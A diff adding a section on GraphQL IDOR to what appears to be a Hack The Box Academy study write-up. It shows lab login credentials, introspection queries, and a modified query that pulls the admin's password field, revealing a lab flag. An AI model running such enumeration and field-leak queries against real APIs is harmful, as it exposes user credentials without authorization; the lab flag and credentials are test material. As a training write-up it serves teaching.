@@ -23,7 +23,6 @@ A GraphQL service is commonly exposed at endpoints such as:
 
 - `/graphql`
 - `/api/graphql`
-- Similar application-specific paths
 
 Interacting directly with the GraphQL endpoint can reveal **misconfigurations and security weaknesses**, making it a valuable attack surface during application testing.
 
@@ -365,3 +364,136 @@ This confirms that **sensitive data is accessible without proper authorization**
 ---
 
 ## Insecure Direct Object Reference (IDOR)
+
+Broken authorization vulnerabilities, particularly **Insecure Direct Object References (IDOR)**, are common in GraphQL implementations. A more detailed explanation of IDOR vulnerabilities can be found in the `web-attacks.md` file located in the `web-attacks` directory of this repository.
+
+To identify IDOR vulnerabilities, we must enumerate the application to locate **direct object references** that may be accessed or manipulated without proper authorization checks.
+
+After authenticating to the application using the provided credentials:
+
+```
+htb-stdnt:AcademyStudent!
+```
+
+we observe the following GraphQL query being sent to the backend server:
+
+```graphql
+{"query":"{posts { uuid title body category author { username }}}"}
+```
+
+![Filtered output](images/idor.PNG)
+
+This query requests all `posts` and retrieves the following fields:
+
+- `uuid`
+- `title`
+- `body`
+- `category`
+- `author`
+
+The server responds by returning multiple `Post` objects. An example response is shown below:
+
+```graphql
+{
+  "uuid": "1",
+  "title": "Lorem ipsum 1",
+  "body": "Lorem ipsum ...",
+  "category": "food",
+  "author": {
+    "username": "admin"
+  }
+}
+```
+
+![Filtered output](images/idor2.PNG)
+
+Notably, the `author` field queries a nested object and currently exposes the `username` subfield. This suggests that additional subfields may also be accessible.
+
+To further enumerate available fields, we interact directly with the GraphQL API using the **GraphiQL** interface:
+
+```
+http://83.136.253.5:46533/graphql
+```
+
+We begin by inspecting the `PostObject` type using an introspection query:
+
+```graphql
+{
+  __type(name: "PostObject") {
+    name
+    fields {
+      name
+      type {
+        name
+        kind
+      }
+    }
+  }
+}
+```
+
+The response indicates that the `author` field references a `UserObject`:
+
+```
+{
+  "name": "author",
+  "type": {
+    "name": "UserObject",
+    "kind": "OBJECT"
+  }
+}
+```
+
+![Filtered output](images/idor3.PNG)
+
+Since `author` resolves to a `UserObject`, we enumerate the fields available within that object:
+
+```graphql
+{
+  __type(name: "UserObject") {
+    name
+    fields {
+      name
+      type {
+        name
+        kind
+      }
+    }
+  }
+}
+```
+
+The following fields are exposed:
+
+- `uuid`
+- `id`
+- `username`
+- `password`
+- `role`
+- `msg`
+- `posts`
+
+![Filtered output](images/idor4.PNG)
+
+The presence of sensitive fields such as `password` indicates a potential authorization weakness.
+
+To test whether access controls are enforced, we modify the original `posts` query to include the `password` field under the `author` object:
+
+```graphql
+{"query":"{posts { uuid title body category author { username password }}}"}
+```
+
+The server responds with the following data:
+
+```
+"author": {
+  "username": "admin",
+  "password": "HTB{79ebbbce53f40edf75c667ef6fd36fae}"
+}
+```
+
+![Filtered output](images/idor5.PNG)
+
+This confirms that the application fails to enforce **object-level and field-level authorization**, allowing unauthorized access to sensitive user data. This behavior constitutes an **Insecure Direct Object Reference (IDOR)** vulnerability within the GraphQL API.
+
+---
